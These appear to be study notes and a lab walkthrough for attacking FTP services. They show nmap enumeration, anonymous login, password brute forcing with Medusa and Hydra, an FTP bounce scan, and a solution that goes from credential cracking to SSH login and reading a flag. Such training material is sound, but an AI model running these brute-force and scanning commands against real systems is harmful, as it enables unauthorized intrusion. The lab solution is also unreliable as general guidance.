### Attacking FTP

```
# Enumeration
# Nmap default scripts -sC includes the ftp-anon Nmap script which checks if a FTP server allows anonymous logins.

sudo nmap -sC -sV -p 21 192.168.2.142

# Anonymous Authentication

ftp 192.168.2.142
Name (192.168.2.142:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
```

### Protocol Specifics Attacks

[Medusa](https://github.com/jmk-foofus/medusa)

```
# Brute Forcing with Medusa

medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
```

```
# FTP Bounce Attack

# Consider we are targetting an FTP Server FTP_DMZ exposed to the internet. 
# Another device within the same network, Internal_DMZ, is not exposed to the internet. 
# We can use the connection to the FTP_DMZ server to scan Internal_DMZ using the FTP Bounce attack 
# and obtain information about the server's open ports. 

# The Nmap -b flag can be used to perform an FTP bounce attack:

nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

### Task Solution

```
# Using different nmap to gether more info about ftp service and port
sudo nmap -sC -sV 10.129.208.50
sudo nmap -A 10.129.208.50
sudo nmap -sC -sV -p 2121 10.129.208.50

ftp 10.129.208.50 2121   # auth as anonymous
ls
get users.list

hydra -L users.list -P passwords.list ftp://10.129.220.123:2121  # cracking with hydra as an option, also can be with medusa

medusa -L users.list -P /usr/share/wordlists/rockyou.txt -h 10.129.208.50 -M ftp # medusa crack example

# Get the user robon and it's iwn pass

ssh robin@10.129.208.50     # ssh to target host with creds from step above
cat flag.txt                # ctf, done
```
